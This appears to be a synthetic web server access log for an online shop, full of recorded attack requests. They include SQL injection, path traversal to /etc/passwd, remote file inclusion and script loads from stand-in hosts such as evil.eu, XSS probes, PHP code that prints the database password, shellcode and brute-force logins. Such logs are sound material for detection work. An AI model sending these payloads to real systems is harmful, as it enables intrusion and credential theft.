115.221.121.44 - - [18/May/2019:03:01:43 +0200] "GET /blog/how-to-shop/ HTTP/1.0" 200 28113 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
115.221.121.44 - - [18/May/2019:03:01:44 +0200] "GET /page/about-us/ HTTP/1.0" 404 89229 "/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
220.243.135.5 - - [18/May/2019:03:01:45 +0200] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 21319 "/blog/how-to-shop/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:01:46 +0200] "GET /blog/how-to-shop/ HTTP/1.0" 200 38747 "/register.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
87.251.81.179 - - [18/May/2019:03:01:47 +0200] "GET /login.php/?username=admin&password=1238 HTTP/1.1" 404 39797 "/update.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:01:48 +0200] "GET /api/v1/customers/?username=admin&password=admin2 HTTP/1.0" 403 58279 "/index.php/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:01:49 +0200] "GET /core/themes/theme.inc/?session=vwdefcwec334scfdjr49ccededfewsd HTTP/1.1" 200 64029 "/index.php/" "Mozilla/5.0 (Linux; Android 5.0; Nexus 4 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.59 Mobile Safari/537.36"
182.34.27.162 - - [18/May/2019:03:01:50 +0200] "GET /api/v1/login/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 404 50603 "/api/v1/register/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
62.109.16.162 - - [18/May/2019:03:01:51 +0200] "GET /index.php/?username=admin&password=1235 HTTP/1.0" 200 13015 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [18/May/2019:03:01:52 +0200] "POST /login.php/ HTTP/1.0" 200 9798 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:01:53 +0200] "GET /api/v1/customers/?file=http://evil.eu/sh HTTP/1.0" 404 76665 "/login.php/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
45.61.164.120 - - [18/May/2019:03:01:54 +0200] "GET /login.php/?username=admin&password=admin HTTP/1.0" 200 41209 "/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
220.243.135.5 - - [18/May/2019:03:01:55 +0200] "GET /api/v1/customers/?id=0%20or%201=1 HTTP/1.0" 403 24006 "/index.php/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
115.221.121.44 - - [18/May/2019:03:01:56 +0200] "GET /api/v1/customers/?ip=|+ls+-l HTTP/1.0" 200 6775 "/login.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
209.133.212.79 - - [18/May/2019:03:01:57 +0200] "GET /api/v1/login/ HTTP/1.0" 200 76516 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:01:58 +0200] "GET /index.php/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 25625 "/login.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:01:59 +0200] "GET /orders.php/?file=http://evil.eu/sh HTTP/1.0" 200 32861 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:02:00 +0200] "GET /.env/README.txt HTTP/1.0" 200 40625 "/core/files/js/upload.js/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
220.243.135.5 - - [18/May/2019:03:02:01 +0200] "GET /index.php/%2e%2e%2f%2e%2e%2f%2e%2e%2ffile:///etc/passwd HTTP/1.0" 200 17723 "/api/v1/login/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:02:02 +0200] "GET /orders.php/ HTTP/1.0" 200 72882 "/login.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:02:03 +0200] "POST /update.php/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 200 10589 "/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:02:04 +0200] "GET /core/files/js/upload.js/?username=admin&password=password HTTP/1.0" 200 39171 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [18/May/2019:03:02:05 +0200] "GET /api/v1/register/ HTTP/1.0" 200 74410 "/login.php/" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
182.34.27.162 - - [18/May/2019:03:02:06 +0200] "POST /?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.1" 200 24343 "/api/v1/customers/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:02:07 +0200] "GET /?customerId=1OR%201=1 HTTP/1.1" 200 6850 "/orders.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:02:07 +0200] "GET /?customerId=1OR%201=1 HTTP/1.1" 200 29973 "/orders.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:02:07 +0200] "GET /?customerId=1OR%201=1 HTTP/1.1" 200 89887 "/orders.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:02:07 +0200] "GET /?customerId=1OR%201=1 HTTP/1.1" 200 35685 "/orders.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:02:07 +0200] "GET /?customerId=1OR%201=1 HTTP/1.1" 200 87873 "/orders.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:02:12 +0200] "GET /blog/better-products-for-2019/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 53855 "/api/v1/login/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
62.109.16.162 - - [18/May/2019:03:02:12 +0200] "GET /blog/better-products-for-2019/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 38815 "/api/v1/login/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
62.109.16.162 - - [18/May/2019:03:02:12 +0200] "GET /blog/better-products-for-2019/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 11191 "/api/v1/login/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
62.109.16.162 - - [18/May/2019:03:02:12 +0200] "GET /blog/better-products-for-2019/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 24016 "/api/v1/login/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
62.109.16.162 - - [18/May/2019:03:02:12 +0200] "GET /blog/better-products-for-2019/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 77062 "/api/v1/login/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
62.109.16.162 - - [18/May/2019:03:02:12 +0200] "GET /blog/better-products-for-2019/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 36069 "/api/v1/login/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
62.109.16.162 - - [18/May/2019:03:02:12 +0200] "GET /blog/better-products-for-2019/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 88342 "/api/v1/login/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
62.109.16.162 - - [18/May/2019:03:02:12 +0200] "GET /blog/better-products-for-2019/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 27621 "/api/v1/login/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
62.109.16.162 - - [18/May/2019:03:02:12 +0200] "GET /blog/better-products-for-2019/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 51545 "/api/v1/login/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
62.109.16.162 - - [18/May/2019:03:02:12 +0200] "GET /blog/better-products-for-2019/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 76158 "/api/v1/login/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
121.225.26.201 - - [18/May/2019:03:02:22 +0200] "GET /index.php/?id=0%20or%201=1 HTTP/1.0" 200 71641 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
87.251.81.179 - - [18/May/2019:03:02:23 +0200] "GET /core/files/js/upload.js/?username=admin&password=password HTTP/1.0" 404 6139 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:02:23 +0200] "GET /core/files/js/upload.js/?username=admin&password=password HTTP/1.0" 404 4009 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:02:23 +0200] "GET /core/files/js/upload.js/?username=admin&password=password HTTP/1.0" 404 54785 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:02:23 +0200] "GET /core/files/js/upload.js/?username=admin&password=password HTTP/1.0" 404 63106 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:02:23 +0200] "GET /core/files/js/upload.js/?username=admin&password=password HTTP/1.0" 404 44577 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:02:28 +0200] "GET /orders.php/?username=admin&password=admin2 HTTP/1.1" 200 28376 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:02:28 +0200] "GET /orders.php/?username=admin&password=admin2 HTTP/1.1" 200 81218 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:02:28 +0200] "GET /orders.php/?username=admin&password=admin2 HTTP/1.1" 200 9372 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:02:28 +0200] "GET /orders.php/?username=admin&password=admin2 HTTP/1.1" 200 8106 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:02:28 +0200] "GET /orders.php/?username=admin&password=admin2 HTTP/1.1" 200 80984 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:02:28 +0200] "GET /orders.php/?username=admin&password=admin2 HTTP/1.1" 200 48685 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:02:28 +0200] "GET /orders.php/?username=admin&password=admin2 HTTP/1.1" 200 72859 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:02:28 +0200] "GET /orders.php/?username=admin&password=admin2 HTTP/1.1" 200 72239 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:02:28 +0200] "GET /orders.php/?username=admin&password=admin2 HTTP/1.1" 200 54315 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:02:28 +0200] "GET /orders.php/?username=admin&password=admin2 HTTP/1.1" 200 41637 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:02:38 +0200] "GET /index.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 30249 "/register.php/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
69.46.0.142 - - [18/May/2019:03:02:39 +0200] "GET /connection.php/?post=%3script%3ealert(1); HTTP/1.0" 200 39175 "/orders.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:02:40 +0200] "GET /core/themes/theme.inc/ HTTP/1.0" 404 65712 "/api/v1/login/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:02:41 +0200] "GET /api/v1/login/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 1781 "/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
62.109.16.162 - - [18/May/2019:03:02:42 +0200] "GET /update.php/?page=/../../../../../../etc/passwd HTTP/1.0" 200 20221 "/core/files/js/editor.js/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
183.87.255.54 - - [18/May/2019:03:02:43 +0200] "GET /api/v1/customers/?username=admin&password=1234 HTTP/1.0" 200 35980 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:02:43 +0200] "GET /api/v1/customers/?username=admin&password=1234 HTTP/1.0" 200 46500 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:02:43 +0200] "GET /api/v1/customers/?username=admin&password=1234 HTTP/1.0" 200 64417 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:02:43 +0200] "GET /api/v1/customers/?username=admin&password=1234 HTTP/1.0" 200 57584 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:02:43 +0200] "GET /api/v1/customers/?username=admin&password=1234 HTTP/1.0" 200 68607 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:02:43 +0200] "GET /api/v1/customers/?username=admin&password=1234 HTTP/1.0" 200 22079 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:02:43 +0200] "GET /api/v1/customers/?username=admin&password=1234 HTTP/1.0" 200 65018 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:02:43 +0200] "GET /api/v1/customers/?username=admin&password=1234 HTTP/1.0" 200 36000 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:02:43 +0200] "GET /api/v1/customers/?username=admin&password=1234 HTTP/1.0" 200 37557 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:02:43 +0200] "GET /api/v1/customers/?username=admin&password=1234 HTTP/1.0" 200 71448 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:02:53 +0200] "POST /?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.0" 200 11005 "/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:02:54 +0200] "GET /?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 503 36621 "/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
182.34.27.162 - - [18/May/2019:03:02:55 +0200] "GET / HTTP/1.0" 400 57374 "/register.php/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
115.221.121.44 - - [18/May/2019:03:02:56 +0200] "GET /index.php/ HTTP/1.0" 404 78307 "/login.php/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:02:57 +0200] "GET /api/v1/customers/ HTTP/1.0" 200 23190 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
69.46.0.142 - - [18/May/2019:03:02:58 +0200] "GET /?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 200 51310 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:02:59 +0200] "GET /authorize.php/?id=0%20or%201=1 HTTP/1.0" 404 9185 "/core/files/js/editor.js/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 OPR/30.1835.49 (Edition beta)"
62.109.16.162 - - [18/May/2019:03:03:00 +0200] "GET /register.php/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb+3\x88\xd2%z HTTP/1.1" 200 58083 "/blog/how-to-shop/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) rekonq/2.4.2 Safari/537.21"
5.13.35.65 - - [18/May/2019:03:03:01 +0200] "GET /register.php/?post=%3script%3ealert(1); HTTP/1.0" 200 16765 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
54.36.149.94 - - [18/May/2019:03:03:02 +0200] "GET /core/files/js/upload.js/ HTTP/1.0" 200 82073 "/update.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
54.36.149.52 - - [18/May/2019:03:03:03 +0200] "GET /core/files/js/upload.js/ HTTP/1.1" 403 58209 "/index.php/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
5.13.35.65 - - [18/May/2019:03:03:04 +0200] "GET / HTTP/1.1" 504 81356 "/api/v1/register/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:03:05 +0200] "GET /api/v1/register/?user=admin&amount=100000 HTTP/1.1" 200 43119 "/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
182.34.27.162 - - [18/May/2019:03:03:06 +0200] "GET /core/themes/theme.inc/?username=admin&password=1239 HTTP/1.0" 200 56191 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:03:07 +0200] "GET /api/v1/login/?user=admin&amount=100000 HTTP/1.0" 200 85436 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:03:08 +0200] "GET /index.php/?id=0%20or%201=1 HTTP/1.0" 200 43665 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:03:09 +0200] "GET /blog/how-to-shop/?username=admin&password=admin HTTP/1.0" 200 51292 "/connection.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:03:10 +0200] "GET / HTTP/1.0" 200 67816 "/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:03:11 +0200] "GET /api/v1/orders/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 48727 "/page/about-us/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
87.251.81.179 - - [18/May/2019:03:03:12 +0200] "GET /login.php/?post=%3script%3ealert(1); HTTP/1.0" 200 51805 "/core/files/js/upload.js/" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
209.133.212.79 - - [18/May/2019:03:03:13 +0200] "GET /index.php/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 78645 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:03:14 +0200] "GET /?post=%3script%3ealert(1); HTTP/1.0" 404 39696 "/login.php/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:03:15 +0200] "GET /connection.php/?post=%3script%3ealert(1); HTTP/1.0" 200 3256 "/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:03:16 +0200] "GET /index.php/%2e%2e%2f%2e%2e%2f%2e%2e%2ffile:///etc/passwd HTTP/1.0" 200 25234 "/core/files/js/upload.js/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
121.225.26.201 - - [18/May/2019:03:03:17 +0200] "GET /connection.php/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 34149 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:03:18 +0200] "GET /api/v1/login/ HTTP/1.0" 200 55698 "/api/v1/register/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
62.109.16.162 - - [18/May/2019:03:03:19 +0200] "GET /connection.php/?file=http://evil.eu/sh HTTP/1.0" 200 47507 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:03:20 +0200] "GET /login.php/\xf9\xa9\xa5\xcc\xa87\x17,b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8 HTTP/1.0" 404 71497 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
69.46.0.142 - - [18/May/2019:03:03:21 +0200] "GET /?page=/../../../../../../etc/passwd HTTP/1.0" 200 19963 "/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
54.36.149.94 - - [18/May/2019:03:03:22 +0200] "GET /api/v1/login/?page=http://192.168.80.128/rfi.php HTTP/1.0" 200 27778 "/login.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
54.36.149.52 - - [18/May/2019:03:03:23 +0200] "GET /orders.php/ HTTP/1.0" 200 71134 "/api/v1/login/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
